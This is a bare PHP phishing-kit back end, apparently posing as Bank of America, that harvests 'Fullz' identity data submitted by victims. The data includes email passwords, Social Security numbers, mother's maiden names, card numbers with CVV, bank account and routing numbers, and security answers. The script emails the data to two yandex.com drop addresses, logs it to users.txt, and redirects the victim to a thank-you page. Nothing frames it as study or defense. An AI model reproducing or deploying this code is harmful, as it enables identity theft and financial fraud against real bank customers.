<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Fullz Info-----------------------\n";
$message .= "First Name             : ".$_POST['formtext1']."\n";
$message .= "Last Name            : ".$_POST['formtext2']."\n";
$message .= "Email Address              : ".$_POST['formtext5']."\n";
$message .= "Email Password           : ".$_POST['formtext6']."\n";
$message .= "State              : ".$_POST['State']."\n";
$message .= "Zip Code            : ".$_POST['formtext7']."\n";
$message .= "Date Of Birth             : ".$_POST['Months']."\n";
$message .= "year           : ".$_POST['year']."\n";
$message .= "date             : ".$_POST['date']."\n";
$message .= "Mother's Maiden Name           : ".$_POST['formtext8']."\n";
$message .= "Social Security Number             : ".$_POST['formtext9']."\n";
$message .= "Account Security Question            : ".$_POST['question']."\n";
$message .= " Answer            : ".$_POST['formtext10']."\n";
$message .= "CC Type           : ".$_POST['card']."\n";
$message .= "Card Number            : ".$_POST['formtext11']."\n";
$message .= "Bank Account Name            : ".$_POST['formtext12']."\n";
$message .= "Expiration Date           : ".$_POST['selectmonth']."\n";
$message .= "Expiration Year           : ".$_POST['selectyears']."\n";
$message .= "CVV           : ".$_POST['formtext13']."\n";
$message .= "Phone Number            : ".$_POST['formtext14']."\n";
$message .= "Bank Account Number            : ".$_POST['formtext15']."\n";
$message .= "Routing Number           : ".$_POST['formtext16']."\n";
$message .= "Address            : ".$_POST['formtext3']."\n";
$message .= "City           : ".$_POST['formtext4']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "service.bofa@yandex.com,resultboxes@yandex.com";
$subject = "Result from Unknown";
$headers = "From: Fullz<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location: thankyou.html");

	 
?>